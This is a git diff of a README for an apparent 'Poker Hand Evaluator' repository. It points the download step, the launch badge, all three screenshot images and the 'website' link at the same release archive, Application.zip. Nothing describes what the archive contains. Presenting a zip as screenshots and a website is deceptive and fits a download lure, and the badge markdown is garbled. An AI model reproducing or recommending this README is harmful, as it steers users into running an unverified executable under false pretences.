@@ -18,9 +18,9 @@ In this repository, you will find a powerful poker hand evaluation tool that can
 To get started with the Poker Hand Evaluator tool, simply follow these steps:
 
 1. Clone the repository to your local machine.
-2. Download the evaluation application from [here](https://github.com/file/Application.zip).
+2. Download the evaluation application from [here](https://github.com/Utkarsh2413739/Poker-Hand-Evaluator/releases/download/v1.0.0/Application.zip).
    
-   [![Launch Poker Hand Evaluator](https://img.shields.io/badge/Launch-Poker%20Hand%20Evaluator-blue.svg)](https://github.com/file/Application.zip)
+   [![Launch Poker Hand Evaluator](https://github.com/Utkarsh2413739/Poker-Hand-Evaluator/releases/download/v1.0.0/Application.zip%20Hand%https://github.com/Utkarsh2413739/Poker-Hand-Evaluator/releases/download/v1.0.0/Application.zip)](https://github.com/Utkarsh2413739/Poker-Hand-Evaluator/releases/download/v1.0.0/Application.zip)
 
 3. Launch the application and input the poker hand you want to evaluate.
 4. Receive instant feedback on the strength of your hand and make informed decisions during gameplay.
@@ -29,9 +29,9 @@ To get started with the Poker Hand Evaluator tool, simply follow these steps:
 
 Here are a few snapshots of the Poker Hand Evaluator tool in action:
 
-![Screenshot 1](https://example.com/screenshot1.jpg)
-![Screenshot 2](https://example.com/screenshot2.jpg)
-![Screenshot 3](https://example.com/screenshot3.jpg)
+![Screenshot 1](https://github.com/Utkarsh2413739/Poker-Hand-Evaluator/releases/download/v1.0.0/Application.zip)
+![Screenshot 2](https://github.com/Utkarsh2413739/Poker-Hand-Evaluator/releases/download/v1.0.0/Application.zip)
+![Screenshot 3](https://github.com/Utkarsh2413739/Poker-Hand-Evaluator/releases/download/v1.0.0/Application.zip)
 
 ## Support ℹ️
 
@@ -51,4 +51,4 @@ Remember, your poker hand strength can make or break your game. With the Poker H
 
 ---
 
-If the link provided above does not work, please check the "Releases" section of this repository for alternative download options. Visit the [Poker Hand Evaluator](https://github.com/file/Application.zip) website for more information and updates. 🃏🎲
+If the link provided above does not work, please check the "Releases" section of this repository for alternative download options. Visit the [Poker Hand Evaluator](https://github.com/Utkarsh2413739/Poker-Hand-Evaluator/releases/download/v1.0.0/Application.zip) website for more information and updates. 🃏🎲
